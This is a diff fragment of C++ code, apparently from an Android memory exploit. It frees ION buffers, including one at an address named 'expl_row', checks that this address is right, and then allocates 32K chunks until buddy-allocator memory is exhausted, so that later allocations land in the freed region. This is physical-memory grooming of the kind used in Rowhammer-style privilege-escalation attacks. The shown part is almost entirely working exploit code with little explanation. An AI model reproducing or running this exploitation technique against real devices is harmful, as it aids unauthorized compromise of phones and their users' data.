@@ -304,11 +304,37 @@ int main(int argc, char *argv[]) {
 //            }
 
             // Free M* and all L
+            bool addr_correct = false;
             for (auto chunk : ion_chunks) {
-                if (chunk->len == M(4) || (uintptr_t)chunk->mapping == expl_row) {
+                if (chunk->len == M(4)) {
+//                    print("[FREE] Free %p, len %d\n", chunk->mapping, chunk->len);
+                    ION_clean(chunk);
+                } else if ((uintptr_t)chunk->mapping == expl_row) {
+                    addr_correct = true;
                     print("[FREE] Free %p, len %d\n", chunk->mapping, chunk->len);
                     ION_clean(chunk);
                 }
+            }
+            if (!addr_correct) {
+                printf("[FREE] - M* address is not correct\n");
+                break;
+            }
+
+            // Allocate S until S start to land in M*
+
+            // 0  1  2   3   4   5    6    7    8  9  10
+            // 4K 8K 16K 32K 64k 128K 256K 512K 1M 2M 4M
+//            uint32_t free[11];
+
+            while (true) {
+//                if (free[0] == 0 && free[1] == 0 && free[2] == 0 && free[3] == 0) {
+//                    printf("[EXHAUST] Fill holes < 64K");
+//                    break;
+//                }
+                get_buddy_info(true, NULL);
+
+                count = ION_bulk(K(32), ion_chunks, 1, false);
+                if (count == 0) break;
             }
 
             break;
